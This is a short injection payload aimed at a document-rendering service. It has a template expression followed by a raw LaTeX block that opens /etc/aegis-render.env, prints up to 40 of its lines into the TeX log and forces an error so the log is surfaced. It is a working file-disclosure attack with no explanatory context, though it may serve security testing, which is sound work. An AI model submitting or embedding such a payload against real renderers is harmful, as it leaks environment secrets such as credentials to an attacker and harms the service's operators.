{{ overrides | merge(defaults) | json }}

```{=latex}
\newread\leak
\newcount\linecount
\openin\leak=/etc/aegis-render.env
\ifeof\leak
  \typeout{AEGIS-MISS:/etc/aegis-render.env}
\else
  \typeout{AEGIS-HIT:/etc/aegis-render.env}
  \linecount=0
  \def\readnext{
    \ifeof\leak
      \let\next\relax
    \else
      \read\leak to \leakline
      \advance\linecount by 1
      \typeout{FILELINE:\the\linecount:\leakline}
      \ifnum\linecount<40
        \let\next\readnext
      \else
        \let\next\relax
      \fi
    \fi
    \next
  }
  \readnext
\fi
\closein\leak
\errmessage{AEGIS-FORCE-DIAGNOSTIC}
\mbox{}
```
